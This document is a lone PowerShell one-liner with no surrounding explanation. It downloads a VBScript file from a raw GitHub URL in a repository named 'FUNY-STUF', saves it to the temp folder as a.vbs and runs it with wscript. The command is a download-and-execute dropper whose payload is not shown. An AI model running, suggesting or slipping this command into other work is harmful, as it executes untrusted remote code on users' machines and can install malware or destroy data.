(iwr "https://raw.githubusercontent.com/dadadadadad1313/FUNY-STUF/refs/heads/main/test.vbs").Content | Out-File -FilePath "$env:TEMP\a.vbs"; wscript "$env:TEMP\a.vbs"
